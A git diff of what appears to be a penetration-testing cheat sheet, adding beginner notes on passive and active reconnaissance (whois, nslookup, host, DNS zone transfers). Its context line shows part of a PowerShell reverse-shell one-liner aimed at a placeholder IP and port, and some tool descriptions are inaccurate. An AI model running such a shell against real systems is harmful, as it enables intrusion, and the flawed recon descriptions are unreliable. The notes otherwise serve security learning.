@@ -73,11 +73,30 @@ $client = New-Object System.Net.Sockets.TCPClient('$(ip)',$(port));$stream = $cl
 ```
 
 
+# Passive Recon
 
+## Some Baic commands
+* `whois` tells info about a domain
+* `nslookup` does a reverse lookup on a domain
+* `hosts` command will tell you about the different types of web servers and their ip addresses.
 
+# Active Recon
 
+## Dns Enumeration
 
+* ```bash
+host $(website)
+```
+This commmand helps in finding the ip address of a domain and also helps in finding different types of webservers and their ips too.
+you can specify the type of web server with the help of -t flag 
 
+## DNS Zone Transfers
+
+This is an amazing technique which will basically tranfer the whole zone file of domain onto anyserver if misconfigured by sysadmins.
+We can find out the domain servers by
+```bash
+host -t ns $(domain)
+```
 
 
 
